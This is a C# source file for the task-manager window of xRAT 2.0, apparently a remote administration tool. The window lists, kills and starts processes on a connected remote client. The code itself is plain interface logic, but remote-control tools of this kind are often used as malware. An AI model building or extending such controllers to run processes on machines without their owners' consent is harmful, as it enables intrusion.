using System;
using System.Windows.Forms;
using Core;

namespace xRAT_2.Forms
{
    public partial class frmTaskManager : Form
    {
        private Client cClient;
        private ListViewColumnSorter lvwColumnSorter;

        public frmTaskManager(Client c)
        {
            cClient = c;
            cClient.Value.frmTM = this;

            InitializeComponent();
            
            lvwColumnSorter = new ListViewColumnSorter();
            lstTasks.ListViewItemSorter = lvwColumnSorter;
        }

        private void frmTaskManager_Load(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                this.Text = string.Format("xRAT 2.0 - Task Manager [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
                new Core.Packets.ServerPackets.GetProcesses().Execute(cClient);
            }
        }

        private void frmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (cClient.Value != null)
                cClient.Value.frmTM = null;
        }

        private void ctxtKillProcess_Click(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                foreach (ListViewItem lvi in lstTasks.SelectedItems)
                {
                    new Core.Packets.ServerPackets.KillProcess(int.Parse(lvi.SubItems[1].Text)).Execute(cClient);
                }
            }
        }

        private void ctxtStartProcess_Click(object sender, EventArgs e)
        {
            string processname = string.Empty;
            if (InputBox.Show("Processname", "Enter Processname:", ref processname) == System.Windows.Forms.DialogResult.OK)
            {
                if (cClient != null)
                    new Core.Packets.ServerPackets.StartProcess(processname).Execute(cClient);
            }
        }

        private void ctxtRefresh_Click(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                new Core.Packets.ServerPackets.GetProcesses().Execute(cClient);
            }
        }

        private void lstTasks_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstTasks.Sort();
        }
    }
}
